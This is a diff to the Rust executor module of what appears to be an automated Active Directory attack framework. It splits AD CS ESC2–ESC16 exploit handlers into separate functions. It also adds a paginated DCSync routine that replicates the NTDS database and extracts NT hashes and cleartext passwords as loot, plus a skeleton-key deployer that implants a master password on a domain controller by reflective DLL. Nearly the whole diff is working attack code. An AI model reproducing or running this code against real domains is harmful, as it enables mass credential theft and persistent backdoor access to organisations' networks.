@@ -233,189 +233,74 @@ pub async fn execute_step(
             ca,
             target_upn,
         } => exec_adcs_esc1(ctx, state, template, ca, target_upn).await,
-        PlannedAction::AdcsEsc2 { template, ca } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC2",
-                &[("template", template.as_str()), ("ca", ca.as_str())],
-            )
-            .await
-        }
+        PlannedAction::AdcsEsc2 { template, ca } => exec_adcs_esc2(ctx, state, template, ca).await,
         PlannedAction::AdcsEsc3 {
             agent_template,
             target_template,
             ca,
             target_upn,
-        } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC3",
-                &[
-                    ("agent_template", agent_template.as_str()),
-                    ("target_template", target_template.as_str()),
-                    ("ca", ca.as_str()),
-                    ("target_upn", target_upn.as_str()),
-                ],
-            )
-            .await
-        }
+        } => exec_adcs_esc3(ctx, state, agent_template, target_template, ca, target_upn).await,
         PlannedAction::AdcsEsc4 { template } => exec_adcs_esc4(ctx, state, template).await,
-        PlannedAction::AdcsEsc5 { ca } => {
-            exec_adcs_guided(ctx, state, "ESC5", &[("ca", ca.as_str())]).await
-        }
+        PlannedAction::AdcsEsc5 { ca } => exec_adcs_esc5(ctx, state, ca).await,
         PlannedAction::AdcsEsc6 {
             template,
             ca,
             target_upn,
         } => exec_adcs_esc6(ctx, state, template, ca, target_upn).await,
-        PlannedAction::AdcsEsc7 { ca } => {
-            exec_adcs_guided(ctx, state, "ESC7", &[("ca", ca.as_str())]).await
-        }
+        PlannedAction::AdcsEsc7 { ca } => exec_adcs_esc7(ctx, state, ca).await,
         PlannedAction::AdcsEsc8 {
             ca,
             template,
             target_upn,
-        } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC8",
-                &[
-                    ("ca", ca.as_str()),
-                    ("template", template.as_str()),
-                    ("target_upn", target_upn.as_str()),
-                ],
-            )
-            .await
-        }
+        } => exec_adcs_esc8(ctx, state, ca, template, target_upn).await,
         PlannedAction::AdcsEsc9 {
             template,
             ca,
             victim,
             target_upn,
-        } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC9",
-                &[
-                    ("template", template.as_str()),
-                    ("ca", ca.as_str()),
-                    ("victim", victim.as_str()),
-                    ("target_upn", target_upn.as_str()),
-                ],
-            )
-            .await
-        }
+        } => exec_adcs_esc9(ctx, state, template, ca, victim, target_upn).await,
         PlannedAction::AdcsEsc10 {
             template,
             ca,
             victim,
             target_upn,
             variant,
-        } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC10",
-                &[
-                    ("template", template.as_str()),
-                    ("ca", ca.as_str()),
-                    ("victim", victim.as_str()),
-                    ("target_upn", target_upn.as_str()),
-                    ("variant", variant.as_str()),
-                ],
-            )
-            .await
-        }
+        } => exec_adcs_esc10(ctx, state, template, ca, victim, target_upn, variant).await,
         PlannedAction::AdcsEsc11 {
             ca,
             template,
             target_upn,
-        } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC11",
-                &[
-                    ("ca", ca.as_str()),
-                    ("template", template.as_str()),
-                    ("target_upn", target_upn.as_str()),
-                ],
-            )
-            .await
-        }
+        } => exec_adcs_esc11(ctx, state, ca, template, target_upn).await,
         PlannedAction::AdcsEsc12 { ca_host, ca_name } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC12",
-                &[("ca_host", ca_host.as_str()), ("ca_name", ca_name.as_str())],
-            )
-            .await
+            exec_adcs_esc12(ctx, state, ca_host, ca_name).await
         }
         PlannedAction::AdcsEsc13 {
             template,
             ca,
             target_upn,
-        } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC13",
-                &[
-                    ("template", template.as_str()),
-                    ("ca", ca.as_str()),
-                    ("target_upn", target_upn.as_str()),
-                ],
-            )
-            .await
-        }
-        PlannedAction::AdcsEsc14 => exec_adcs_guided(ctx, state, "ESC14", &[]).await,
+        } => exec_adcs_esc13(ctx, state, template, ca, target_upn).await,
+        PlannedAction::AdcsEsc14 => exec_adcs_esc14(ctx, state).await,
         PlannedAction::AdcsEsc15 {
             template,
             ca,
             target_upn,
-        } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC15",
-                &[
-                    ("template", template.as_str()),
-                    ("ca", ca.as_str()),
-                    ("target_upn", target_upn.as_str()),
-                ],
-            )
-            .await
-        }
+        } => exec_adcs_esc15(ctx, state, template, ca, target_upn).await,
         PlannedAction::AdcsEsc16 {
             template,
             ca,
             victim,
             target_upn,
-        } => {
-            exec_adcs_guided(
-                ctx,
-                state,
-                "ESC16",
-                &[
-                    ("template", template.as_str()),
-                    ("ca", ca.as_str()),
-                    ("victim", victim.as_str()),
-                    ("target_upn", target_upn.as_str()),
-                ],
-            )
-            .await
-        }
+        } => exec_adcs_esc16(ctx, state, template, ca, victim, target_upn).await,
         PlannedAction::ForgeGoldenTicket { krbtgt_hash } => {
             exec_golden_ticket(ctx, state, krbtgt_hash).await
         }
         PlannedAction::ForgeSilverTicket { service_hash, spn } => {
             exec_silver_ticket(ctx, state, service_hash, spn).await
         }
+        PlannedAction::DeploySkeletonKey {
+            target_dc,
+            master_password,
+        } => exec_skeleton_key(ctx, state, target_dc, master_password).await,
         PlannedAction::CrackHashes { hashes } => exec_crack_hashes(ctx, state, hashes).await,
         PlannedAction::RunPlaybook { playbook_id } => {
             // Playbooks are expanded by the runner, not the executor
@@ -495,6 +380,10 @@ pub async fn compensate_step(
         PlannedAction::ForgeSilverTicket { spn, .. } => {
             let source = format!("silver_ticket:{}", spn.replace(['/', '\\'], "_"));
             cleanup_local_artifacts(state, "KIRBI", &source, false).await
+        }
+        PlannedAction::DeploySkeletonKey { target_dc, .. } => {
+            let source = format!("skeleton_key:{}", target_dc);
+            cleanup_local_artifacts(state, "SKELETON_KEY", &source, true).await
         }
         PlannedAction::AdcsEsc1 { .. } => {
             cleanup_local_artifacts(state, "PFX", "adcs_esc1", true).await
@@ -2993,6 +2882,259 @@ async fn exec_adcs_esc6(
     }
 }
 
+/// ESC2: Enrollment Agent — discovers vulnerable templates and produces operator-ready path.
+async fn exec_adcs_esc2(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    template: &str,
+    ca: &str,
+) -> StepResult {
+    info!("{}", "  ESC2: Enrollment Agent exploitation".red().bold());
+    exec_adcs_guided(ctx, state, "ESC2", &[("template", template), ("ca", ca)]).await
+}
+
+/// ESC3: Enrollment Agent Template.
+async fn exec_adcs_esc3(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    agent_template: &str,
+    target_template: &str,
+    ca: &str,
+    target_upn: &str,
+) -> StepResult {
+    info!(
+        "{}",
+        "  ESC3: Enrollment Agent Template exploitation"
+            .red()
+            .bold()
+    );
+    exec_adcs_guided(
+        ctx,
+        state,
+        "ESC3",
+        &[
+            ("agent_template", agent_template),
+            ("target_template", target_template),
+            ("ca", ca),
+            ("target_upn", target_upn),
+        ],
+    )
+    .await
+}
+
+/// ESC5: Vulnerable PKI Object Access.
+async fn exec_adcs_esc5(ctx: &ExecContext, state: &mut EngagementState, ca: &str) -> StepResult {
+    info!("{}", "  ESC5: PKI Object Access exploitation".red().bold());
+    exec_adcs_guided(ctx, state, "ESC5", &[("ca", ca)]).await
+}
+
+/// ESC7: Manage CA / Manage Certificates rights.
+async fn exec_adcs_esc7(ctx: &ExecContext, state: &mut EngagementState, ca: &str) -> StepResult {
+    info!(
+        "{}",
+        "  ESC7: Manage CA/Certificates exploitation".red().bold()
+    );
+    exec_adcs_guided(ctx, state, "ESC7", &[("ca", ca)]).await
+}
+
+/// ESC8: NTLM Relay to AD CS.
+async fn exec_adcs_esc8(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    ca: &str,
+    template: &str,
+    target_upn: &str,
+) -> StepResult {
+    info!("{}", "  ESC8: NTLM Relay to AD CS".red().bold());
+    exec_adcs_guided(
+        ctx,
+        state,
+        "ESC8",
+        &[
+            ("ca", ca),
+            ("template", template),
+            ("target_upn", target_upn),
+        ],
+    )
+    .await
+}
+
+/// ESC9: No Security Extensions.
+async fn exec_adcs_esc9(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    template: &str,
+    ca: &str,
+    victim: &str,
+    target_upn: &str,
+) -> StepResult {
+    info!("{}", "  ESC9: No Security Extensions".red().bold());
+    exec_adcs_guided(
+        ctx,
+        state,
+        "ESC9",
+        &[
+            ("template", template),
+            ("ca", ca),
+            ("victim", victim),
+            ("target_upn", target_upn),
+        ],
+    )
+    .await
+}
+
+/// ESC10: Weak Certificate Mappings.
+async fn exec_adcs_esc10(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    template: &str,
+    ca: &str,
+    victim: &str,
+    target_upn: &str,
+    variant: &str,
+) -> StepResult {
+    info!("{}", "  ESC10: Weak Certificate Mappings".red().bold());
+    exec_adcs_guided(
+        ctx,
+        state,
+        "ESC10",
+        &[
+            ("template", template),
+            ("ca", ca),
+            ("victim", victim),
+            ("target_upn", target_upn),
+            ("variant", variant),
+        ],
+    )
+    .await
+}
+
+/// ESC11: Relay to ICPR.
+async fn exec_adcs_esc11(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    ca: &str,
+    template: &str,
+    target_upn: &str,
+) -> StepResult {
+    info!("{}", "  ESC11: Relay to ICPR".red().bold());
+    exec_adcs_guided(
+        ctx,
+        state,
+        "ESC11",
+        &[
+            ("ca", ca),
+            ("template", template),
+            ("target_upn", target_upn),
+        ],
+    )
+    .await
+}
+
+/// ESC12: Enrollment Agent Restrictions.
+async fn exec_adcs_esc12(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    ca_host: &str,
+    ca_name: &str,
+) -> StepResult {
+    info!("{}", "  ESC12: Enrollment Agent Restrictions".red().bold());
+    exec_adcs_guided(
+        ctx,
+        state,
+        "ESC12",
+        &[("ca_host", ca_host), ("ca_name", ca_name)],
+    )
+    .await
+}
+
+/// ESC13: Issued Certificate Policies.
+async fn exec_adcs_esc13(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    template: &str,
+    ca: &str,
+    target_upn: &str,
+) -> StepResult {
+    info!("{}", "  ESC13: Issued Certificate Policies".red().bold());
+    exec_adcs_guided(
+        ctx,
+        state,
+        "ESC13",
+        &[
+            ("template", template),
+            ("ca", ca),
+            ("target_upn", target_upn),
+        ],
+    )
+    .await
+}
+
+/// ESC14: Enrollment Flag misconfiguration.
+async fn exec_adcs_esc14(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
+    info!(
+        "{}",
+        "  ESC14: Enrollment Flag misconfiguration".red().bold()
+    );
+    exec_adcs_guided(ctx, state, "ESC14", &[]).await
+}
+
+/// ESC15: Enrollment Agent Template misconfiguration.
+async fn exec_adcs_esc15(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    template: &str,
+    ca: &str,
+    target_upn: &str,
+) -> StepResult {
+    info!(
+        "{}",
+        "  ESC15: Enrollment Agent Template misconfiguration"
+            .red()
+            .bold()
+    );
+    exec_adcs_guided(
+        ctx,
+        state,
+        "ESC15",
+        &[
+            ("template", template),
+            ("ca", ca),
+            ("target_upn", target_upn),
+        ],
+    )
+    .await
+}
+
+/// ESC16: Weak Certificate Mappings (alternate).
+async fn exec_adcs_esc16(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    template: &str,
+    ca: &str,
+    victim: &str,
+    target_upn: &str,
+) -> StepResult {
+    info!(
+        "{}",
+        "  ESC16: Weak Certificate Mappings (alternate)"
+            .red()
+            .bold()
+    );
+    exec_adcs_guided(
+        ctx,
+        state,
+        "ESC16",
+        &[
+            ("template", template),
+            ("ca", ca),
+            ("victim", victim),
+            ("target_upn", target_upn),
+        ],
+    )
+    .await
+}
+
 async fn exec_adcs_guided(
     ctx: &ExecContext,
     state: &mut EngagementState,
@@ -4166,41 +4308,6 @@ async fn exec_dcsync(
         nc_dn.clone()
     };
 
-    let mut gnc_stub = Vec::new();
-    gnc_stub.extend_from_slice(drs_handle); // DRS handle
-    gnc_stub.extend_from_slice(&8u32.to_le_bytes()); // dwInVersion = 8
-    // DRS_MSG_GETCHGREQ_V8 â€” for EXOP_REPL_OBJ single-object DCSync,
-    // zero USN vectors and NULL pUpToDateVecDest are correct (request all data).
-    // The pNC field is a pointer to DSNAME structure (not an NDR conformant string).
-    gnc_stub.extend_from_slice(&build_dsname(&target_dn)); // pNC â†’ DSNAME
-    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // usnvecFrom.usnHighObjUpdate
-    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // usnvecFrom.usnHighPropUpdate
-    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // pUpToDateVecDest (NULL)
-    gnc_stub.extend_from_slice(&(1u32 | 0x20 | 0x80000).to_le_bytes()); // ulFlags
-    gnc_stub.extend_from_slice(&500u32.to_le_bytes()); // cMaxObjects
-    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // cMaxBytes (unlimited)
-    gnc_stub.extend_from_slice(&7u32.to_le_bytes()); // ulExtendedOp: EXOP_REPL_OBJ
-
-    let gnc_req = build_rpc_request(3, &gnc_stub);
-    let gnc_resp = match smb.pipe_transact("drsuapi", &gnc_req).await {
-        Ok(r) => r,
-        Err(e) => {
-            // Even a failed GNC often means we have replication rights
-            warn!("  DRSGetNCChanges error (may still have partial data): {e}");
-            return StepResult {
-                success: false,
-                output: format!("DRSGetNCChanges failed: {e}"),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
-    };
-
-    //Parse replicated attributes from response using DRSR parser
-    use overthrone_core::proto::drsr;
-
-    let resp_size = gnc_resp.len();
-
     // Derive session key for DRS attribute decryption.
     // Prefer the real NTLM session key from the SMB authentication exchange.
     // Fall back to computing ResponseKeyNT (NTLMv2 hash) from credentials.
@@ -4254,51 +4361,211 @@ async fn exec_dcsync(
         response_key.to_vec()
     };
 
-    let (estimated_entries, parsed_creds) =
+    // For single-object DCSync, use the original single-call approach
+    if target_user.is_some() {
+        let mut gnc_stub = Vec::new();
+        gnc_stub.extend_from_slice(drs_handle);
+        gnc_stub.extend_from_slice(&8u32.to_le_bytes());
+        gnc_stub.extend_from_slice(&build_dsname(&target_dn));
+        gnc_stub.extend_from_slice(&0u32.to_le_bytes());
+        gnc_stub.extend_from_slice(&0u32.to_le_bytes());
+        gnc_stub.extend_from_slice(&0u32.to_le_bytes());
+        gnc_stub.extend_from_slice(&(1u32 | 0x20 | 0x80000).to_le_bytes());
+        gnc_stub.extend_from_slice(&500u32.to_le_bytes());
+        gnc_stub.extend_from_slice(&0u32.to_le_bytes());
+        gnc_stub.extend_from_slice(&7u32.to_le_bytes());
+
+        let gnc_req = build_rpc_request(3, &gnc_stub);
+        let gnc_resp = match smb.pipe_transact("drsuapi", &gnc_req).await {
+            Ok(r) => r,
+            Err(e) => {
+                warn!("  DRSGetNCChanges error (may still have partial data): {e}");
+                return StepResult {
+                    success: false,
+                    output: format!("DRSGetNCChanges failed: {e}"),
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                };
+            }
+        };
+
+        use overthrone_core::proto::drsr;
+        let resp_size = gnc_resp.len();
+
+        let (estimated_entries, parsed_creds) =
+            match drsr::parse_get_nc_changes_reply(&gnc_resp, &session_key) {
+                Ok(result) => {
+                    let count = result.objects.len();
+                    for obj in &result.objects {
+                        let nt_hex = obj
+                            .nt_hash
+                            .as_ref()
+                            .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
+                            .unwrap_or_else(|| "aad3b435b51404ee".to_string());
+
+                        let lm_hex = obj
+                            .lm_hash
+                            .as_ref()
+                            .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
+                            .unwrap_or_else(|| "aad3b435b51404ee".to_string());
+
+                        info!(
+                            "  {}\\{} (RID {}) → {}:{}",
+                            obj.object_sid.as_deref().unwrap_or("?").dimmed(),
+                            obj.sam_account_name.bold(),
+                            obj.rid.unwrap_or(0),
+                            lm_hex.dimmed(),
+                            nt_hex.red()
+                        );
+
+                        if obj.nt_hash.is_some() {
+                            state.add_credential(CompromisedCred {
+                                username: obj.sam_account_name.clone(),
+                                secret: nt_hex.clone(),
+                                secret_type: SecretType::NtHash,
+                                source: format!("DCSync from {}", ctx.dc_ip),
+                                is_admin: obj.uac.map(|u| u & 0x200 != 0).unwrap_or(false),
+                                admin_on: vec![],
+                            });
+                        }
+
+                        if let Some(ref supp) = obj.supplemental_credentials {
+                            if supp.aes256_key.is_some() {
+                                info!("    → Kerberos AES-256 key found");
+                            }
+                            if let Some(ref cleartext) = supp.cleartext {
+                                info!("    → Cleartext password: [REDACTED]");
+                                debug!("    → Cleartext password: {}", cleartext);
+                                state.add_credential(CompromisedCred {
+                                    username: obj.sam_account_name.clone(),
+                                    secret: cleartext.clone(),
+                                    secret_type: SecretType::Password,
+                                    source: format!("DCSync cleartext from {}", ctx.dc_ip),
+                                    is_admin: false,
+                                    admin_on: vec![],
+                                });
+                            }
+                        }
+                    }
+                    (count, count)
+                }
+                Err(e) => {
+                    warn!("DRSR parse failed (falling back to estimate): {}", e);
+                    (1, 0)
+                }
+            };
+
+        info!(
+            "  ✓ DCSync response: {} bytes, {} creds extracted",
+            resp_size, parsed_creds
+        );
+
+        state.loot.push(LootItem {
+            loot_type: "NTDS".to_string(),
+            source: ctx.dc_ip.clone(),
+            path: None,
+            entries: estimated_entries,
+            collected_at: Utc::now(),
+        });
+
+        let msg = format!(
+            "DCSync from {}: {} ({} bytes replicated)",
+            ctx.dc_ip, scope, resp_size
+        );
+        return StepResult {
+            success: resp_size > 48,
+            output: msg,
+            new_credentials: estimated_entries,
+            new_admin_hosts: 0,
+        };
+    }
+
+    // Full NTDS extraction with pagination loop
+    info!("  Starting full NTDS extraction with pagination...");
+    use overthrone_core::proto::drsr;
+
+    let mut all_objects: Vec<drsr::ReplicatedObject> = Vec::new();
+    let mut usn_high: u64 = 0;
+    let mut uuid_invoc_id: [u8; 16] = [0u8; 16];
+    let mut batch_count = 0u32;
+    let max_batches = 10_000; // Safety limit to prevent infinite loops
+    let c_max_objects = 2000u32; // Larger batch size for efficiency
+
+    loop {
+        if batch_count >= max_batches {
+            warn!("  DCSync: reached maximum batch limit ({max_batches}), stopping");
+            break;
+        }
+
+        batch_count += 1;
+
+        // Build paginated request with USN cursor
+        let gnc_req = drsr::build_drs_get_nc_changes_paginated(
+            drs_handle.try_into().unwrap_or(&[0u8; 20]),
+            &target_dn,
+            usn_high,
+            &uuid_invoc_id,
+            c_max_objects,
+            false,
+        );
+
+        let gnc_resp = match smb.pipe_transact("drsuapi", &gnc_req).await {
+            Ok(r) => r,
+            Err(e) => {
+                warn!("  DCSync batch {batch_count} failed: {e}");
+                if batch_count == 1 {
+                    return StepResult {
+                        success: false,
+                        output: format!("DRSGetNCChanges failed on first batch: {e}"),
+                        new_credentials: 0,
+                        new_admin_hosts: 0,
+                    };
+                }
+                break;
+            }
+        };
+
+        if gnc_resp.len() < 48 {
+            debug!("  DCSync batch {batch_count}: response too short, stopping");
+            break;
+        }
+
         match drsr::parse_get_nc_changes_reply(&gnc_resp, &session_key) {
             Ok(result) => {
-                let count = result.objects.len();
+                let obj_count = result.objects.len();
+                debug!(
+                    "  DCSync batch {batch_count}: {obj_count} objects, more_data={}",
+                    result.more_data
+                );
+
                 for obj in &result.objects {
-                    let nt_hex = obj
-                        .nt_hash
-                        .as_ref()
-                        .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
-                        .unwrap_or_else(|| "aad3b435b51404ee".to_string());
+                    if let Some(ref nt) = obj.nt_hash {
+                        let nt_hex = nt.iter().map(|b| format!("{:02x}", b)).collect::<String>();
+                        info!(
+                            "  {}\\{} (RID {}) → NT:{}",
+                            obj.object_sid.as_deref().unwrap_or("?").dimmed(),
+                            obj.sam_account_name.bold(),
+                            obj.rid.unwrap_or(0),
+                            nt_hex.red()
+                        );
 
-                    let lm_hex = obj
-                        .lm_hash
-                        .as_ref()
-                        .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
-                        .unwrap_or_else(|| "aad3b435b51404ee".to_string());
-
-                    info!(
-                        "  {}\\{} (RID {}) â†’ {}:{}",
-                        obj.object_sid.as_deref().unwrap_or("?").dimmed(),
-                        obj.sam_account_name.bold(),
-                        obj.rid.unwrap_or(0),
-                        lm_hex.dimmed(),
-                        nt_hex.red()
-                    );
-
-                    if obj.nt_hash.is_some() {
                         state.add_credential(CompromisedCred {
                             username: obj.sam_account_name.clone(),
                             secret: nt_hex.clone(),
                             secret_type: SecretType::NtHash,
                             source: format!("DCSync from {}", ctx.dc_ip),
-                            is_admin: obj.uac.map(|u| u & 0x200 != 0).unwrap_or(false), // NORMAL_ACCOUNT
+                            is_admin: obj.uac.map(|u| u & 0x200 != 0).unwrap_or(false),
                             admin_on: vec![],
                         });
                     }
 
-                    // Log supplemental credentials if found
                     if let Some(ref supp) = obj.supplemental_credentials {
                         if supp.aes256_key.is_some() {
-                            info!("    â†³ Kerberos AES-256 key found");
+                            info!("    → {} Kerberos AES-256", obj.sam_account_name);
                         }
                         if let Some(ref cleartext) = supp.cleartext {
-                            info!("    â†³ Cleartext password: [REDACTED]");
-                            debug!("    â†³ Cleartext password: {}", cleartext);
+                            info!("    → {} cleartext: [REDACTED]", obj.sam_account_name);
+                            debug!("    → {} cleartext: {}", obj.sam_account_name, cleartext);
                             state.add_credential(CompromisedCred {
                                 username: obj.sam_account_name.clone(),
                                 secret: cleartext.clone(),
@@ -4310,46 +4577,72 @@ async fn exec_dcsync(
                         }
                     }
                 }
-                (count, count)
+
+                all_objects.extend(result.objects);
+
+                // Update pagination cursor
+                if result.usnvec_to[0] > usn_high {
+                    usn_high = result.usnvec_to[0];
+                }
+                uuid_invoc_id = result.uuid_invoc_id_src;
+
+                if !result.more_data || obj_count == 0 {
+                    debug!("  DCSync: no more data after batch {batch_count}");
+                    break;
+                }
+
+                // Small delay between batches to avoid overwhelming the DC
+                tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
             }
             Err(e) => {
-                warn!("DRSR parse failed (falling back to estimate): {}", e);
-                let est = if target_user.is_some() {
-                    1
-                } else {
-                    resp_size / 500
-                };
-                (est, 0)
+                warn!("  DCSync batch {batch_count} parse error: {e}");
+                if batch_count == 1 {
+                    return StepResult {
+                        success: false,
+                        output: format!("DRSR parse failed on first batch: {e}"),
+                        new_credentials: 0,
+                        new_admin_hosts: 0,
+                    };
+                }
+                break;
             }
-        };
+        }
+    }
+
+    let total_creds = state
+        .credentials
+        .values()
+        .filter(|c| c.source.starts_with("DCSync"))
+        .count();
 
     info!(
-        "  {} DCSync response: {} bytes, {} creds extracted",
-        "âœ“".green(),
-        resp_size,
-        parsed_creds
+        "  ✓ DCSync complete: {} batches, {} total objects, {} credentials extracted",
+        batch_count,
+        all_objects.len(),
+        total_creds
     );
 
     state.loot.push(LootItem {
         loot_type: "NTDS".to_string(),
         source: ctx.dc_ip.clone(),
         path: None,
-        entries: estimated_entries,
+        entries: all_objects.len(),
         collected_at: Utc::now(),
     });
 
-    if target_user.is_none() {
-        state.has_domain_admin = true;
-    }
+    state.has_domain_admin = true;
 
     let msg = format!(
-        "DCSync from {}: {} ({} bytes replicated)",
-        ctx.dc_ip, scope, resp_size
+        "DCSync from {}: full NTDS extracted ({} batches, {} objects, {} creds)",
+        ctx.dc_ip,
+        batch_count,
+        all_objects.len(),
+        total_creds
     );
     StepResult {
-        success: resp_size > 48,
+        success: total_creds > 0,
         output: msg,
-        new_credentials: estimated_entries,
+        new_credentials: total_creds,
         new_admin_hosts: 0,
     }
 }
@@ -4648,6 +4941,109 @@ async fn exec_silver_ticket(
             new_credentials: 0,
             new_admin_hosts: 0,
         },
+    }
+}
+
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// Skeleton Key Executor
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+/// Deploy skeleton key on a domain controller.
+async fn exec_skeleton_key(
+    _ctx: &ExecContext,
+    state: &mut EngagementState,
+    target_dc: &str,
+    master_password: &str,
+) -> StepResult {
+    info!(
+        "{}",
+        format!("  Deploying skeleton key on {}...", target_dc)
+            .red()
+            .bold()
+    );
+
+    let dc_ip = state
+        .computers
+        .iter()
+        .find(|c| {
+            c.dns_hostname.as_ref().map(|h| h.to_lowercase()) == Some(target_dc.to_lowercase())
+                || c.sam_account_name.to_lowercase() == target_dc.to_lowercase()
+        })
+        .map(|c| {
+            c.dns_hostname
+                .clone()
+                .unwrap_or_else(|| c.sam_account_name.clone())
+        })
+        .unwrap_or_else(|| target_dc.to_string());
+
+    let config = overthrone_core::postex::SkeletonKeyConfig {
+        master_password: master_password.to_string(),
+        target_dc: target_dc.to_string(),
+        target_dc_ip: dc_ip.clone(),
+        deployment_method: overthrone_core::postex::DeploymentMethod::ReflectiveDll,
+        verify_after_deploy: true,
+        auto_cleanup: false,
+    };
+
+    let mut exploiter = overthrone_core::postex::SkeletonKeyExploiter::new(config);
+
+    match exploiter.exploit().await {
+        Ok(result) => {
+            if result.success {
+                info!(
+                    "  [OK] Skeleton key deployed on {} (method: {})",
+                    target_dc, result.method
+                );
+
+                let cleanup = result.cleanup_commands.join("\n");
+                if !cleanup.is_empty() {
+                    let cleanup_path = format!(
+                        "./loot/skeleton_key_cleanup_{}.txt",
+                        target_dc.replace(['.', '\\'], "_")
+                    );
+                    let _ = tokio::fs::write(&cleanup_path, &cleanup).await;
+                    info!("  [OK] Cleanup commands saved to {}", cleanup_path);
+                }
+
+                state.loot.push(LootItem {
+                    loot_type: "SKELETON_KEY".to_string(),
+                    source: format!("skeleton_key:{}", target_dc),
+                    path: None,
+                    entries: 1,
+                    collected_at: Utc::now(),
+                });
+
+                let msg = format!(
+                    "Skeleton key deployed on {} (master: {}, method: {})",
+                    target_dc, master_password, result.method
+                );
+
+                StepResult {
+                    success: true,
+                    output: msg,
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                }
+            } else {
+                let error = result.error.unwrap_or_else(|| "Unknown error".to_string());
+                warn!("  [FAIL] Skeleton key deployment failed: {}", error);
+                StepResult {
+                    success: false,
+                    output: format!("Skeleton key failed on {}: {}", target_dc, error),
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                }
+            }
+        }
+        Err(e) => {
+            warn!("  [FAIL] Skeleton key execution error: {}", e);
+            StepResult {
+                success: false,
+                output: format!("Skeleton key error: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            }
+        }
     }
 }
 
